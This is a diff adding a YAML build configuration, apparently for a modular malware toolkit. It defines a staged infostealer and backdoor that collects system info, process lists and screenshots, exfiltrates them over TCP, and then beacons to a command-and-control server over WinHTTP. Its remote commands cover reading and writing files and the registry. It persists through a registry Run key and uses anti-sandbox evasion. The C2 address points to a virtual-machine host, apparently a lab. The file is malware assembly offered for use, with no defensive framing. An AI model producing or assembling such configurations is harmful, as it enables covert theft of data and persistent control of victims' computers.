@@ -1,0 +1,37 @@
+name: backdoor_staged_http
+description: Hybrid infostealer+backdoor — collect and exfil first, then beacon loop (WinHTTP)
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/screenshot
+
+exfil: exfil/tcp_flush
+
+c2: c2/winhttp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_filelist
+  - commands/cmd_fileread
+  - commands/cmd_filewrite
+  - commands/cmd_screenshot
+  - commands/cmd_registry
+  - commands/cmd_netinfo
+
+arch: arch/backdoor_staged
+persist: persist/registry_run
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/anti_sandbox
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "30000"
